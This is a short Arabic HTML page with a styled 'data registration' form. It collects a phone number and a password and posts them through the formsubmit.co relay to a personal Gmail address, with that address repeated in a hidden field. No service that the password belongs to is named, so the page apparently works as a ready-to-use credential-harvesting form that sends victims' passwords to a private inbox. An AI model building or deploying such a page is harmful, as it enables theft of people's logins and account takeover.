<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <title>نموذج عادية</title>
  <style>
    body {
      font-family: 'Arial';
      text-align: center;
      padding: 40px;
      background-color: #f1f1f1;
    }
    form {
      background: #fff;
      padding: 30px;
      border-radius: 10px;
      max-width: 400px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: 1px solid #ccc;
      direction: rtl;
    }
    button {
      padding: 10px 20px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>

  <h2>نموذج تسجيل البيانات</h2>

  <form id="formBase64" action="https://formsubmit.co/yblyyll@gmail.com" method="POST">
    
    <!-- رقم الهاتف -->
    <input type="tel" name="رقم_الهاتف" placeholder="رقم الهاتف" required>

    <!-- بريد إلكتروني مخفي وثابت -->
    <input type="hidden" name="البريد_الإلكتروني" value="yblyyll@gmail.com">

    <!-- كلمة المرور عادية -->
    <input type="password" name="كلمة_المرور" placeholder="كلمة المرور" required>

    <!-- منع سبام -->
    <input type="text" name="_honey" style="display:none">

    <!-- إعادة التوجيه بعد الإرسال -->
    <input type="hidden" name="_redirect" value="thanks.html">

    <button type="submit">إرسال</button>
  </form>

</body>
</html>
